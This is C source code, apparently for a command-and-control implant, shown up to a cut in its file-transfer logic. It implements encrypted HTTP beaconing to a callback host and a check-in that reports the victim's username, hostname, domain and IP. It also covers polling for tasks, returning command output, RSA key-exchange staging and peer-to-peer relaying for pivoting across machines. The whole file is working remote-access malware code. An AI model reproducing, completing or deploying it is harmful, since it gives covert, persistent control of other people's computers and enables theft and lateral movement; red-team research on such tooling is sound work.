#include <windows.h>
#include "headers/celebi.h"
#include "headers/tcg.h"
#include "headers/HTTP.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);

WINBASEAPI size_t MSVCRT$strlen(const char *str);
WINBASEAPI int MSVCRT$strcmp(const char *string1, const char *string2);
WINBASEAPI char * MSVCRT$strstr(const char *str, const char *strSearch);

WINBASEAPI void MSVCRT$free(void *ptr);
WINBASEAPI void *MSVCRT$malloc(size_t size);

/*
 *
 * TRANSPORT HELPERS
 *
 * The wire envelope is: base64( uuid(36) || [aes256_hmac encrypted] binary message )
 * GET requests put the base64 message in a query parameter (URL-safe base64).
 * P2P children (smb/tcp profiles) send the same base64 envelope over their
 * channel instead of HTTP, framed as [u32 LE length][bytes].
 *
*/

static char *agent_concat(int part_count, const char **parts) {
	// Concatenate N strings into a NUL-terminated buffer.
	size_t total = 1;
	for (int i = 0; i < part_count; i++) {
		total += MSVCRT$strlen(parts[i]);
	}
	char *out = KERNEL32$VirtualAlloc(0, total, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	size_t off = 0;
	for (int i = 0; i < part_count; i++) {
		size_t plen = MSVCRT$strlen(parts[i]);
		for (size_t j = 0; j < plen; j++) {
			out[off++] = parts[i][j];
		}
	}
	out[off] = '\0';
	return out;
}

static BOOL agent_send(AgentState *state, const char *uuid, const char *binary_msg, int binary_len, BOOL use_get, HttpResponse *response) {
	// Build the wire envelope: uuid + (encrypted) binary, base64 encoded.
	const char *blob = binary_msg;
	int blob_len = binary_len;
	unsigned char *encrypted = NULL;

	if (state->crypto_enabled) {
		size_t enc_len = 0;
		encrypted = crypto_aes256_hmac_encrypt(state->aes_key, (const unsigned char *)binary_msg, (size_t)binary_len, &enc_len);
		if (encrypted == NULL) {
			return FALSE;
		}
		blob = (const char *)encrypted;
		blob_len = (int)enc_len;
	}

	int wire_len = 36 + blob_len;
	char *wire = KERNEL32$VirtualAlloc(0, wire_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	int offset = 0;
	for (int i = 0; i < 36; i++) {
		wire[offset] = uuid[i];
		offset++;
	}
	for (int i = 0; i < blob_len; i++) {
		wire[offset] = blob[i];
		offset++;
	}
	if (encrypted != NULL) {
		KERNEL32$VirtualFree(encrypted, 0, MEM_RELEASE);
	}

	int encoded_len = ((wire_len * 4) / 3) + 5;
	char *encoded_msg = KERNEL32$VirtualAlloc(0, encoded_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	base64_encode(wire, wire_len, encoded_msg);
	KERNEL32$VirtualFree(wire, 0, MEM_RELEASE);

	// P2P child: send the envelope over the peer channel, block for the reply.
	if (state->is_p2p_child && state->p2p_peer.active) {
		BOOL ok = FALSE;
		if (p2p_send(&state->p2p_peer, encoded_msg) == 0) {
			// A reply lost in a deep relay must time out instead of wedging the
			// agent forever; the caller reports the failure and keeps going.
			char *reply = p2p_recv_timeout(&state->p2p_peer, P2P_RECV_TIMEOUT_SEC);
			if (reply != NULL) {
				size_t rlen = MSVCRT$strlen(reply);
				response->body = MSVCRT$malloc(rlen + 1);
				if (response->body != NULL) {
					for (size_t i = 0; i < rlen; i++) {
						response->body[i] = reply[i];
					}
					response->body[rlen] = '\0';
					response->body_size = (SIZE_T)rlen;
					response->status_code = 200;
					ok = TRUE;
				}
				KERNEL32$VirtualFree(reply, 0, MEM_RELEASE);
			}
		}
		KERNEL32$VirtualFree(encoded_msg, 0, MEM_RELEASE);
		return ok;
	}

	// Build the request URI.
	HttpURI uri = {0};
	char *path = NULL;
	BOOL result = FALSE;
	uri.host = state->params.callback_host;
	uri.port = state->params.callback_port;

	if (use_get && state->params.get_uri != NULL && state->params.get_uri[0] != '\0') {
		// GET /<get_uri>?<query_path_name>=<base64url>
		// The message is already base64; just make it URL-safe (+ -> -, / -> _).
		size_t url_len = MSVCRT$strlen(encoded_msg) + 1;
		char *url_encoded = KERNEL32$VirtualAlloc(0, url_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
		for (size_t i = 0; encoded_msg[i] != '\0'; i++) {
			if (encoded_msg[i] == '+') { url_encoded[i] = '-'; }
			else if (encoded_msg[i] == '/') { url_encoded[i] = '_'; }
			else { url_encoded[i] = encoded_msg[i]; }
		}
		url_encoded[MSVCRT$strlen(encoded_msg)] = '\0';
		const char *qpn = (state->params.query_path_name != NULL && state->params.query_path_name[0] != '\0')
			? state->params.query_path_name : "q";
		const char *parts[5] = {"/", state->params.get_uri, "?", qpn, "="};
		char *prefix = agent_concat(5, parts);
		const char *parts2[2] = {prefix, url_encoded};
		path = agent_concat(2, parts2);
		KERNEL32$VirtualFree(prefix, 0, MEM_RELEASE);
		KERNEL32$VirtualFree(url_encoded, 0, MEM_RELEASE);
		uri.path = path;
		result = HttpRequest(state->http, HTTP_METHOD_GET, &uri, NULL, NULL, response);
	} else {
		// POST /<post_uri> with the message in the body
		const char *post_uri = (state->params.callback_uri != NULL && state->params.callback_uri[0] != '\0')
			? state->params.callback_uri : "data";
		const char *parts[2] = {"/", post_uri};
		path = agent_concat(2, parts);
		uri.path = path;
		HttpBody body = {(unsigned char *) encoded_msg, MSVCRT$strlen(encoded_msg)};
		result = HttpRequest(state->http, HTTP_METHOD_POST, &uri, NULL, &body, response);
	}

	KERNEL32$VirtualFree(path, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(encoded_msg, 0, MEM_RELEASE);
	return result;
}

static char *agent_recv(AgentState *state, HttpResponse *response, int *out_len) {
	// Decode the reply envelope: base64( uuid(36) || [encrypted] binary ).
	// Returns a NUL-terminated buffer holding the decrypted binary message, or NULL.
	*out_len = 0;
	if (response->body_size < 4) {
		return NULL;
	}

	char *decoded = KERNEL32$VirtualAlloc(0, response->body_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	if (base64_decode(response->body, response->body_size, decoded) != 0) {
		KERNEL32$VirtualFree(decoded, 0, MEM_RELEASE);
		return NULL;
	}

	size_t dec_len = (response->body_size / 4) * 3;
	if (response->body_size > 0 && response->body[response->body_size - 1] == '=') { dec_len--; }
	if (response->body_size > 1 && response->body[response->body_size - 2] == '=') { dec_len--; }
	if (dec_len <= 36) {
		KERNEL32$VirtualFree(decoded, 0, MEM_RELEASE);
		return NULL;
	}

	char *payload = decoded + 36;
	int payload_len = (int)(dec_len - 36);

	if (state->crypto_enabled) {
		size_t plain_len = 0;
		unsigned char *plain = crypto_aes256_hmac_decrypt(state->aes_key, (const unsigned char *)payload, (size_t)payload_len, &plain_len);
		KERNEL32$VirtualFree(decoded, 0, MEM_RELEASE);
		if (plain == NULL) {
			return NULL;
		}
		char *out = KERNEL32$VirtualAlloc(0, plain_len + 1, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
		for (size_t i = 0; i < plain_len; i++) {
			out[i] = (char)plain[i];
		}
		out[plain_len] = '\0';
		KERNEL32$VirtualFree(plain, 0, MEM_RELEASE);
		*out_len = (int)plain_len;
		return out;
	}

	char *out = KERNEL32$VirtualAlloc(0, payload_len + 1, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0; i < payload_len; i++) {
		out[i] = payload[i];
	}
	out[payload_len] = '\0';
	KERNEL32$VirtualFree(decoded, 0, MEM_RELEASE);
	*out_len = payload_len;
	return out;
}

/*
 *
 * CHECKIN LOGIC
 *
*/

char *generate_checkin_message(CheckinRequest *checkin, int *msg_len) {
	// Allocate space and construct the serialized checkin message.
	// 1 type byte + payload UUID string + 4 pid bytes + NUL-terminated strings.

	int len = 1;
	len += MSVCRT$strlen(checkin->payload_uuid) + 1;
	len += 4;
	len += MSVCRT$strlen(checkin->username) + 1;
	len += MSVCRT$strlen(checkin->hostname) + 1;
	len += MSVCRT$strlen(checkin->domain) + 1;
	len += MSVCRT$strlen(checkin->ip) + 1;
	int offset = 0;

	char *msg = KERNEL32$VirtualAlloc(0, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);

	// 1 byte for the message type.
	pack_char(msg, &offset, MESSAGE_TYPE_CHECKIN);

	// The payload UUID, so Mythic can link the callback even when the outer
	// envelope UUID is a staging tempUUID.
	pack_string(msg, &offset, checkin->payload_uuid);

	// 4 bytes for the PID.
	pack_uint(msg, &offset, checkin->pid);

	// Optional string fields.
	pack_string(msg, &offset, checkin->username);
	pack_string(msg, &offset, checkin->hostname);
	pack_string(msg, &offset, checkin->domain);
	pack_string(msg, &offset, checkin->ip);

	*msg_len = offset;
	return msg;
}

void parse_checkin_reply(char *decoded_body, int body_len, CheckinReply *reply) {
	// Unpack the fields into a struct.
	int offset = 0;
	
	reply->action = unpack_char(decoded_body, &offset);
	
	reply->callback_uuid = unpack_str(decoded_body, &offset);
	reply->status = unpack_str(decoded_body, &offset);
}

void free_checkin_request(CheckinRequest *request) {
	if (request->payload_uuid != NULL) { KERNEL32$VirtualFree(request->payload_uuid, 0, MEM_RELEASE); }
	if (request->username != NULL) { KERNEL32$VirtualFree(request->username, 0, MEM_RELEASE); }
	if (request->hostname != NULL) { KERNEL32$VirtualFree(request->hostname, 0, MEM_RELEASE); }
	if (request->domain != NULL) { KERNEL32$VirtualFree(request->domain, 0, MEM_RELEASE); }
	if (request->ip != NULL) { KERNEL32$VirtualFree(request->ip, 0, MEM_RELEASE); }
}

void free_checkin_reply(CheckinReply *reply) {
	if (reply->callback_uuid != NULL) { KERNEL32$VirtualFree(reply->callback_uuid, 0, MEM_RELEASE); }
	if (reply->status != NULL) { KERNEL32$VirtualFree(reply->status, 0, MEM_RELEASE); }
}

BOOL perform_checkin(AgentState *state, CheckinReply *reply) {
	// Generate checkin payload.
	CheckinRequest checkin = { 0 };
	checkin.payload_uuid = clone_str(state->params.payload_uuid);
	
	// Use the checkin PICO to gather basic situational awareness info, if possible.
	ResolvedPico pico = { 0 };
	BOOL result = resolve_loaded_pico(&state->file_vault, &state->funcs, &pico, state->builtin_picos.checkin);
	if (result == FALSE) { return FALSE; }
	
	CHECKIN_PICO entrypoint = (CHECKIN_PICO) pico.entrypoint;
	entrypoint(&checkin);
	
	// Send checkin payload to C2 server (always POST).
	// After RSA EKE the envelope UUID is the temp staging UUID (the checkin
	// message itself carries the payload UUID so Mythic can link the callback).
	int msg_len = 0;
	char *msg = generate_checkin_message(&checkin, &msg_len);
	HttpResponse response = {0};
	
	const char *checkin_uuid = (state->staging_uuid != NULL) ? state->staging_uuid : state->params.payload_uuid;
	result = agent_send(state, checkin_uuid, msg, msg_len, FALSE, &response);
	
	// If we get a 200 response code, parse the reply.
	if (result == TRUE && response.status_code == 200) {
		int reply_len = 0;
		char *decoded = agent_recv(state, &response, &reply_len);
		if (decoded != NULL) {
			parse_checkin_reply(decoded, reply_len, reply);
			KERNEL32$VirtualFree(decoded, 0, MEM_RELEASE);
		} else {
			result = FALSE;
		}
	} else {
		result = FALSE;
	}
	
	// Free unneeded allocations.
	free_resolved_pico(&pico);
	free_checkin_request(&checkin);
	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
	MSVCRT$free(response.body);
	MSVCRT$free(response.content_type);
	
	return result;
}

/*
 *
 * TASKING LOGIC
 *
*/

char *generate_tasking_message(TaskingRequest *tasking, int *msg_len) {
	// Allocate space and construct the serialized tasking message.
	// [2][tasking_size(1)][delegate_count u32 LE][per: uuid\0 c2_profile\0 message\0]
	//   [edge_count u32 LE][per: source\0 destination\0 action\0 c2_profile\0]

	int len = 1 + 1;
	len += 4; /* delegate count */
	for (int i = 0; i < tasking->delegate_count; i++) {
		len += MSVCRT$strlen(tasking->delegate_uuids[i]) + 1;
		len += MSVCRT$strlen(tasking->delegate_profiles[i]) + 1;
		len += MSVCRT$strlen(tasking->delegate_msgs[i]) + 1;
	}
	len += 4; /* edge count */
	for (int i = 0; i < tasking->edge_count; i++) {
		len += MSVCRT$strlen(tasking->edge_sources[i]) + 1;
		len += MSVCRT$strlen(tasking->edge_dests[i]) + 1;
		len += MSVCRT$strlen(tasking->edge_actions[i]) + 1;
		len += MSVCRT$strlen(tasking->edge_profiles[i]) + 1;
	}
	int offset = 0;

	char *msg = KERNEL32$VirtualAlloc(0, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);

	// 1 byte for the message type.
	pack_char(msg, &offset, MESSAGE_TYPE_TASKING);

	// 1 byte for the tasking size.
	pack_char(msg, &offset, tasking->tasking_size);

	// Delegate messages to relay (p2p parent).
	pack_uint(msg, &offset, (unsigned int)tasking->delegate_count);
	for (int i = 0; i < tasking->delegate_count; i++) {
		pack_string(msg, &offset, tasking->delegate_uuids[i]);
		pack_string(msg, &offset, tasking->delegate_profiles[i]);
		pack_string(msg, &offset, tasking->delegate_msgs[i]);
	}

	// Callback graph edge updates (p2p parent).
	pack_uint(msg, &offset, (unsigned int)tasking->edge_count);
	for (int i = 0; i < tasking->edge_count; i++) {
		pack_string(msg, &offset, tasking->edge_sources[i]);
		pack_string(msg, &offset, tasking->edge_dests[i]);
		pack_string(msg, &offset, tasking->edge_actions[i]);
		pack_string(msg, &offset, tasking->edge_profiles[i]);
	}

	*msg_len = offset;
	return msg;
}

void parse_tasking_reply(char *decoded_body, int body_len, TaskingReply *reply) {
	// Unpack the fields into a struct.
	int offset = 0;

	reply->action = unpack_char(decoded_body, &offset);
	reply->tasking_size = unpack_char(decoded_body, &offset);

	size_t task_len = reply->tasking_size * sizeof(TaskInfo);
	reply->tasks = KERNEL32$VirtualAlloc(0, task_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0; i < reply->tasking_size; i++) {
		TaskInfo task = { 0 };

		task.id = unpack_str(decoded_body, &offset);
		task.command = unpack_str(decoded_body, &offset);
		task.parameters = unpack_str(decoded_body, &offset);
		task.timestamp = unpack_int(decoded_body, &offset);

		reply->tasks[i] = task;
	}

	// Delegate responses (p2p parent). Absent for plain http agents.
	if (offset + 2 <= body_len) {
		unsigned int delegate_count = unpack_uint(decoded_body, &offset);
		if (delegate_count > 0 && delegate_count < 4096) {
			reply->delegate_count = (int)delegate_count;
			reply->delegate_uuids = KERNEL32$VirtualAlloc(0, sizeof(char *) * delegate_count, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
			reply->delegate_msgs = KERNEL32$VirtualAlloc(0, sizeof(char *) * delegate_count, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
			reply->delegate_new_uuids = KERNEL32$VirtualAlloc(0, sizeof(char *) * delegate_count, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
			for (unsigned int i = 0; i < delegate_count; i++) {
				reply->delegate_uuids[i] = unpack_str(decoded_body, &offset);
				reply->delegate_msgs[i] = unpack_str(decoded_body, &offset);
				reply->delegate_new_uuids[i] = unpack_str(decoded_body, &offset);
			}
		}
	}
}

void free_tasking_request(TaskingRequest *request) {
	if (request->callback_uuid != NULL) { KERNEL32$VirtualFree(request->callback_uuid, 0, MEM_RELEASE); }
	for (int i = 0; i < request->delegate_count; i++) {
		KERNEL32$VirtualFree(request->delegate_uuids[i], 0, MEM_RELEASE);
		KERNEL32$VirtualFree(request->delegate_profiles[i], 0, MEM_RELEASE);
		KERNEL32$VirtualFree(request->delegate_msgs[i], 0, MEM_RELEASE);
	}
	if (request->delegate_uuids != NULL) { KERNEL32$VirtualFree(request->delegate_uuids, 0, MEM_RELEASE); }
	if (request->delegate_profiles != NULL) { KERNEL32$VirtualFree(request->delegate_profiles, 0, MEM_RELEASE); }
	if (request->delegate_msgs != NULL) { KERNEL32$VirtualFree(request->delegate_msgs, 0, MEM_RELEASE); }
	for (int i = 0; i < request->edge_count; i++) {
		KERNEL32$VirtualFree(request->edge_sources[i], 0, MEM_RELEASE);
		KERNEL32$VirtualFree(request->edge_dests[i], 0, MEM_RELEASE);
		KERNEL32$VirtualFree(request->edge_actions[i], 0, MEM_RELEASE);
		KERNEL32$VirtualFree(request->edge_profiles[i], 0, MEM_RELEASE);
	}
	if (request->edge_sources != NULL) { KERNEL32$VirtualFree(request->edge_sources, 0, MEM_RELEASE); }
	if (request->edge_dests != NULL) { KERNEL32$VirtualFree(request->edge_dests, 0, MEM_RELEASE); }
	if (request->edge_actions != NULL) { KERNEL32$VirtualFree(request->edge_actions, 0, MEM_RELEASE); }
	if (request->edge_profiles != NULL) { KERNEL32$VirtualFree(request->edge_profiles, 0, MEM_RELEASE); }
}

void free_tasking_reply(TaskingReply *reply) {
	if (reply->tasks != NULL) {
		for (int i = 0; i < reply->tasking_size; i++) {
			KERNEL32$VirtualFree(reply->tasks[i].id, 0, MEM_RELEASE);
			KERNEL32$VirtualFree(reply->tasks[i].command, 0, MEM_RELEASE);
			KERNEL32$VirtualFree(reply->tasks[i].parameters, 0, MEM_RELEASE);
		}
		KERNEL32$VirtualFree(reply->tasks, 0, MEM_RELEASE);
	}
	for (int i = 0; i < reply->delegate_count; i++) {
		KERNEL32$VirtualFree(reply->delegate_uuids[i], 0, MEM_RELEASE);
		KERNEL32$VirtualFree(reply->delegate_msgs[i], 0, MEM_RELEASE);
		KERNEL32$VirtualFree(reply->delegate_new_uuids[i], 0, MEM_RELEASE);
	}
	if (reply->delegate_uuids != NULL) { KERNEL32$VirtualFree(reply->delegate_uuids, 0, MEM_RELEASE); }
	if (reply->delegate_msgs != NULL) { KERNEL32$VirtualFree(reply->delegate_msgs, 0, MEM_RELEASE); }
	if (reply->delegate_new_uuids != NULL) { KERNEL32$VirtualFree(reply->delegate_new_uuids, 0, MEM_RELEASE); }
}

BOOL perform_tasking(AgentState *state, TaskingReply *reply) {
	// Generate tasking payload.
	TaskingRequest tasking = { 0 };
	tasking.callback_uuid = clone_str(state->params.callback_uuid);
	tasking.tasking_size = 1;

	// Relay any messages queued by linked p2p children (downlinks). Any agent —
	// egress or a p2p child — can hold links for pivoting.
	if (state->link_count > 0) {
		/* count queued messages across all links */
		int total = 0;
		for (int i = 0; i < state->link_count; i++) {
			if (state->links[i] != NULL && state->links[i]->active) {
				total += state->links[i]->in_count;
			}
		}
		tasking.delegate_count = total;
		if (tasking.delegate_count > 0) {
			/* Guard against relaying our own frames back into the chain: under
			 * some relay conditions a copy of our own last request can end up
			 * queued on a downlink (the envelope uuid matches our own). Such a
			 * frame must never be forwarded — it makes the server echo our own
			 * request as the child's delegate reply and corrupts the round trip.
			 * The frame is base64(uuid(36) || blob), so the first 48 chars are
			 * exactly the base64 of our own callback uuid. */
			char own_b64[64];
			base64_encode(state->params.callback_uuid, 36, own_b64);
			tasking.delegate_uuids = KERNEL32$VirtualAlloc(0, sizeof(char *) * tasking.delegate_count, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
			tasking.delegate_profiles = KERNEL32$VirtualAlloc(0, sizeof(char *) * tasking.delegate_count, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
			tasking.delegate_msgs = KERNEL32$VirtualAlloc(0, sizeof(char *) * tasking.delegate_count, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
			int n = 0;
			for (int i = 0; i < state->link_count && n < total; i++) {
				P2P_PEER *p = state->links[i];
				if (p == NULL || !p->active) {
					continue;
				}
				while (p->in_count > 0 && n < total) {
					char *msg = p2p_pop_in(p);
					/* Drop a self-echo frame (prefix compare, no strncmp import). */
					int is_self = 1;
					for (int k = 0; k < 48; k++) {
						if (msg[k] != own_b64[k]) {
							is_self = 0;
							break;
						}
					}
					if (is_self) {
						KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
						continue;
					}
					const char *uuid = (p->mythic_uuid != NULL) ? p->mythic_uuid : p->local_uuid;
					const char *profile = (p->profile != NULL) ? p->profile : "smb";
					tasking.delegate_uuids[n] = clone_str((char *)uuid);
					tasking.delegate_profiles[n] = clone_str((char *)profile);
					tasking.delegate_msgs[n] = msg;
					n++;
				}
			}
			tasking.delegate_count = n;
		}
		// Flush any pending edge updates (link/unlink) in the same message.
		tasking.edge_count = state->pending_edge_count;
		if (tasking.edge_count > 0) {
			tasking.edge_sources = KERNEL32$VirtualAlloc(0, sizeof(char *) * tasking.edge_count, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
			tasking.edge_dests = KERNEL32$VirtualAlloc(0, sizeof(char *) * tasking.edge_count, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
			tasking.edge_actions = KERNEL32$VirtualAlloc(0, sizeof(char *) * tasking.edge_count, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
			tasking.edge_profiles = KERNEL32$VirtualAlloc(0, sizeof(char *) * tasking.edge_count, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
			for (int i = 0; i < tasking.edge_count; i++) {
				tasking.edge_sources[i] = state->pending_edges[i].source;
				tasking.edge_dests[i] = state->pending_edges[i].destination;
				tasking.edge_actions[i] = state->pending_edges[i].action;
				tasking.edge_profiles[i] = state->pending_edges[i].c2_profile;
			}
			KERNEL32$VirtualFree(state->pending_edges, 0, MEM_RELEASE);
			state->pending_edges = NULL;
			state->pending_edge_count = 0;
			state->pending_edge_cap = 0;
		}
	}

	int msg_len = 0;
	char *msg = generate_tasking_message(&tasking, &msg_len);
	
	// Send tasking payload to C2 server (GET when get_uri is configured, else POST).
	HttpResponse response = {0};
	
	BOOL result = agent_send(state, state->params.callback_uuid, msg, msg_len, TRUE, &response);
	
	// If we get a 200 response code, parse the reply.
	if (result == TRUE && response.status_code == 200) {
		int reply_len = 0;
		char *decoded = agent_recv(state, &response, &reply_len);
		if (decoded != NULL) {
			parse_tasking_reply(decoded, reply_len, reply);
			KERNEL32$VirtualFree(decoded, 0, MEM_RELEASE);
		} else {
			result = FALSE;
		}
	} else {
		result = FALSE;
	}
	
	// Free unneeded allocations.
	free_tasking_request(&tasking);
	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
	MSVCRT$free(response.body);
	MSVCRT$free(response.content_type);
	
	return result;
}

/*
 *
 * POST LOGIC
 *
*/

char *generate_post_message(TaskPostRequest *post, int *msg_len) {
	// Allocate space and construct the serialized post_response message.
	// 1 type byte + 3 NUL-terminated strings + 1 completed flag.
	
	int len = 1;
	len += MSVCRT$strlen(post->task_id) + 1;
	len += MSVCRT$strlen(post->task_output) + 1;
	len += MSVCRT$strlen(post->task_status) + 1;
	len += 1; // completed flag
	int offset = 0;
	
	char *msg = KERNEL32$VirtualAlloc(0, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	
	// 1 byte for the message type.
	pack_char(msg, &offset, MESSAGE_TYPE_POST);

	// String fields.
	pack_string(msg, &offset, post->task_id);
	pack_string(msg, &offset, post->task_output);
	pack_string(msg, &offset, post->task_status);
	
	// 1 byte indicating whether this response completes the task (1) or not (0).
	pack_char(msg, &offset, post->completed ? 1 : 0);
	
	*msg_len = offset;
	return msg;
}

void free_post_request(TaskPostRequest *request) {
	if (request->callback_uuid != NULL) { KERNEL32$VirtualFree(request->callback_uuid, 0, MEM_RELEASE); }
	if (request->task_id != NULL) { KERNEL32$VirtualFree(request->task_id, 0, MEM_RELEASE); }
	if (request->task_output != NULL) { KERNEL32$VirtualFree(request->task_output, 0, MEM_RELEASE); }
	if (request->task_status != NULL) { KERNEL32$VirtualFree(request->task_status, 0, MEM_RELEASE); }
}

BOOL perform_post(AgentState *state, TaskInfo *task, TaskPostReply *reply, char *output, char *status, BOOL completed) {
	// Generate post payload.
	TaskPostRequest post = { 0 };
	post.callback_uuid = clone_str(state->params.callback_uuid);
	post.task_id = clone_str(task->id);
	post.task_output = output;
	post.task_status = status;
	post.completed = completed;
	int msg_len = 0;
	char *msg = generate_post_message(&post, &msg_len);
	
	// Send post payload to C2 server (always POST).
	HttpResponse response = {0};
	
	BOOL result = agent_send(state, state->params.callback_uuid, msg, msg_len, FALSE, &response);
	
	if (result == TRUE && response.status_code == 200) {
		// Currently there is no resubmission logic for if the C2 throws an error, so don't bother parsing the response.
		reply->success = 1;
	} else {
		reply->success = 0;
		result = FALSE;
	}
	
	// Free unneeded allocations.
	free_post_request(&post);
	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
	MSVCRT$free(response.body);
	MSVCRT$free(response.content_type);
	
	return result;
}

/*
 *
 * STAGING LOGIC (RSA EKE)
 *
*/

char *generate_staging_message(const char *session_id, const char *pubkey_b64, int *msg_len) {
	// [5][session_id\0][pubkey_b64\0]
	int len = 1;
	len += MSVCRT$strlen(session_id) + 1;
	len += MSVCRT$strlen(pubkey_b64) + 1;
	int offset = 0;
	
	char *msg = KERNEL32$VirtualAlloc(0, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	
	pack_char(msg, &offset, MESSAGE_TYPE_STAGING);
	pack_string(msg, &offset, session_id);
	pack_string(msg, &offset, pubkey_b64);
	
	*msg_len = offset;
	return msg;
}

void parse_staging_reply(char *decoded_body, int body_len, char *temp_uuid_out, int uuid_cap,
                         char *session_key_out, int key_cap, char *session_id_out, int id_cap) {
	int offset = 1; /* skip the message type byte */
	char *uuid = unpack_str(decoded_body, &offset);
	char *session_key = unpack_str(decoded_body, &offset);
	char *session_id = unpack_str(decoded_body, &offset);
	
	for (int i = 0; uuid[i] != '\0' && i < uuid_cap - 1; i++) { temp_uuid_out[i] = uuid[i]; }
	temp_uuid_out[MSVCRT$strlen(uuid) < (size_t)uuid_cap ? MSVCRT$strlen(uuid) : uuid_cap - 1] = '\0';
	for (int i = 0; session_key[i] != '\0' && i < key_cap - 1; i++) { session_key_out[i] = session_key[i]; }
	session_key_out[MSVCRT$strlen(session_key) < (size_t)key_cap ? MSVCRT$strlen(session_key) : key_cap - 1] = '\0';
	for (int i = 0; session_id[i] != '\0' && i < id_cap - 1; i++) { session_id_out[i] = session_id[i]; }
	session_id_out[MSVCRT$strlen(session_id) < (size_t)id_cap ? MSVCRT$strlen(session_id) : id_cap - 1] = '\0';
	
	KERNEL32$VirtualFree(uuid, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(session_key, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(session_id, 0, MEM_RELEASE);
}

BOOL perform_staging(AgentState *state, EKE_RSA *rsa, char *temp_uuid_out, int uuid_cap,
                     char *session_key_out, int key_cap) {
	// Generate a 20-char random session id.
	char session_id[21];
	{
		const char *alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		unsigned char rnd[20];
		crypto_random_bytes(rnd, sizeof(rnd));
		for (int i = 0; i < 20; i++) {
			session_id[i] = alphabet[rnd[i] % 62];
		}
		session_id[20] = '\0';
	}
	
	int msg_len = 0;
	char *msg = generate_staging_message(session_id, rsa->pubkey_b64, &msg_len);
	if (msg == NULL) {
		return FALSE;
	}
	
	// The staging message is encrypted with the initial payload key (if any)
	// and uses the payload UUID as the envelope UUID.
	HttpResponse response = {0};
	BOOL result = agent_send(state, state->params.payload_uuid, msg, msg_len, FALSE, &response);
	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
	
	if (result == TRUE && response.status_code == 200) {
		int reply_len = 0;
		char *decoded = agent_recv(state, &response, &reply_len);
		if (decoded != NULL) {
			if (decoded[0] == MESSAGE_TYPE_STAGING_REPLY) {
				char session_id_back[21] = {0};
				parse_staging_reply(decoded, reply_len, temp_uuid_out, uuid_cap, session_key_out, key_cap, session_id_back, sizeof(session_id_back));
				if (MSVCRT$strcmp(session_id_back, session_id) != 0) {
					result = FALSE;
				}
			} else {
				result = FALSE;
			}
			KERNEL32$VirtualFree(decoded, 0, MEM_RELEASE);
		} else {
			result = FALSE;
		}
	} else {
		result = FALSE;
	}
	
	MSVCRT$free(response.body);
	MSVCRT$free(response.content_type);
	return result;
}

/*
 *
 * UPLOAD LOGIC
 *
 * In this context, we mean "uploading" from the C2 server TO the agent.
 *
*/

UploadManager initialise_upload_manager(char *callback_uuid, char *task_id, char *file_uuid) {
	UploadManager upload = { 0 };
	
	upload.callback_uuid = clone_str(callback_uuid);
	upload.task_id = clone_str(task_id);
	upload.file_uuid = clone_str(file_uuid);
	upload.chunk_size = FILE_CHUNK_SIZE;
	upload.next_chunk = 1;
	upload.current_buffer = KERNEL32$VirtualAlloc(0, FILE_CHUNK_SIZE, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	upload.buflen = 0;
	upload.bufsize = FILE_CHUNK_SIZE;
	upload.finished = FALSE;
	upload.error = FALSE;
	
	return upload;
}

char *generate_upload_message(UploadManager *upload, int *msg_len) {
	// Allocate space and construct the serialized upload message.
	// 1 type byte + 2 NUL-terminated strings + 2 x 4-byte ints.
	
	int len = 1;
	len += MSVCRT$strlen(upload->task_id) + 1;
	len += MSVCRT$strlen(upload->file_uuid) + 1;
	len += 4 + 4;
	int offset = 0;
	
	char *msg = KERNEL32$VirtualAlloc(0, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	
	// 1 byte for the message type.
	pack_char(msg, &offset, MESSAGE_TYPE_UPLOAD);
	
	// Task and file ID.
	pack_string(msg, &offset, upload->task_id);
	pack_string(msg, &offset, upload->file_uuid);
	
	// Chunk information.
	pack_uint(msg, &offset, upload->chunk_size);
	pack_uint(msg, &offset, upload->next_chunk);
	
	*msg_len = offset;
	return msg;
}

void parse_upload_reply(char *decoded_body, int body_len, UploadManager *upload) {
	// Unpack the fields into a struct.
	int offset = 1; // skip over the message type byte
	
	int total_chunks = unpack_int(decoded_body, &offset);
	upload->next_chunk = unpack_int(decoded_body, &offset) + 1;
	
	if (upload->next_chunk > total_chunks) {
		upload->finished = TRUE;
	}
	
	char *encoded_chunk_data = unpack_str(decoded_body, &offset);
	
